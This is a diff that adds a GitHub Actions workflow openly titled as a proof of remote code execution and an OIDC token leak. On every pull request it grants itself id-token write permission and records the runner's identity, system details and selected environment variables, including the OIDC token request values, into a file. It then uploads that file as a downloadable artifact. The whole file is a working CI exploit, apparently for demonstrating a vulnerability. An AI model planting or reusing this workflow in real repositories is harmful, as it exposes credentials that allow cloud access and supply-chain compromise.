@@ -1,0 +1,35 @@
+name: Proof of RCE & OIDC Leak
+
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Leak basic proof to artifact
+        run: |
+          echo "SAFE_CI_PROOF [+] Executing payload..." > leaks.txt
+          echo "== WHOAMI ==" >> leaks.txt
+          whoami >> leaks.txt
+          echo "== ID ==" >> leaks.txt
+          id >> leaks.txt
+          echo "== UNAME ==" >> leaks.txt
+          uname -a >> leaks.txt
+          echo "== OS RELEASE ==" >> leaks.txt
+          cat /etc/os-release >> leaks.txt
+          echo "== ENV VARS (SELECTED) ==" >> leaks.txt
+          env | grep -E '^(ACTIONS_ID_TOKEN_REQUEST_|GITHUB_|CI|RUNNER_|HOME|USER|PATH)' >> leaks.txt
+        env:
+          MARKER: SAFE_CI_PROOF
+
+      - name: Upload leak artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: leaks
+          path: leaks.txt
